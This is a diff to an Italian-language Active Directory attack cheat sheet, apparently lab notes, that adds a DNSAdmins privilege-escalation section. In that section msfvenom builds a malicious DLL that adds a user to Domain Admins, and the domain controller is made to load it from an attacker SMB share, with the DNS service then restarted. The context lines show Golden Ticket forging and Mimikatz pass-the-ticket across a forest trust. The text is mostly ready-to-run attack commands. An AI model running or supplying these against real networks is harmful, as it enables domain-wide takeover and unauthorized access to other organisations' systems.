@@ -379,11 +379,33 @@ Execute the task
 			- Get-ObjectAcl -SamAccountName "Domain Admins" -ResolveGUIDs | ?{$_.IdentityReference -match 'claudionepc'}
 ```
 
+
+## DNSAdmins
+### E' possibile per i membri del gruppo DNSAdmins caricare DLL arbitrarie con i privilegi del dns.exe. In caso che DC serve come DNS si può fare escalation a Domain Admins. 
+### E' importante riavviare il servizio DNS
+```
+			- powershell -ep bypass
+			- net user claudione /domain
+			- Get-NetGroupMember -GroupName "DNSAdmins"
+			- msfvenom -p windows/x64/exec cmd='net group "domain admins" claudione /add /domain' -f dll > mimilib.dll (creazione DLL malevola)
+			
+			- dnscmd dcorp-dc /config /serverlevelplugindll \\172.16.50.100\dll\mimilib.dll  (possiamo chiedere al dcorp-dc vittima di caricare la nostra DLL malevola al prossimo avvio del servizio (o al riavvio dell'attaccante))
+			o
+			- $dnsettings = Get-DnsServerSetting -ComputerName dcorp dc -Verbose -All
+			- $dnsettings.ServerLevelPluginDll = "\\172.16.50.100\dll\mimilib.dll"
+			- Set-DnsServerSetting -InputObject $dnsettings -ComputerName dcorp-dc -Verbose
+			
+			- sc \\dcorp-dc stop dns
+			- sc \\dcorp-dc start dns
+			- net user claudione /domain
+```
+
+
 ## Trust Flow Across Forest
 <img src="Trust_flow_across_forest.png" width="400">
 <img src="Trust_flow_across_forest_1.png" width="400">
 
-### Da un DC domain possiamo forgiare un TGT (Golden Ticket) per un Enterprise Admins. Passiamo da un Domain Admins ad un Enterprise Admins (riconosciuto perchè il suo SID finisce con 519.Possiede l'accesso amministrativo a tutti i domini in una foresta)
+### Da un DC domain possiamo forgiare un TGT (Golden Ticket) per un Enterprise Admins. Passiamo da un Domain Admins ad un Enterprise Admins (riconosciuto perchè il suo SID finisce con 519. Possiede l'accesso amministrativo a tutti i domini in una foresta)
 ```
 			- powershell -ep bypass
 			- Import-Module Invoke-Mimikatz.ps1
@@ -391,3 +413,4 @@ Execute the task
 			- Invoke-Mimikatz -Command '"kerberos:ptt C:\Users\studentuser\Desktop\krbtgt_txt.kirbi"'
 			- ls \\finance-dc.finance.corp\C$
 ```
+
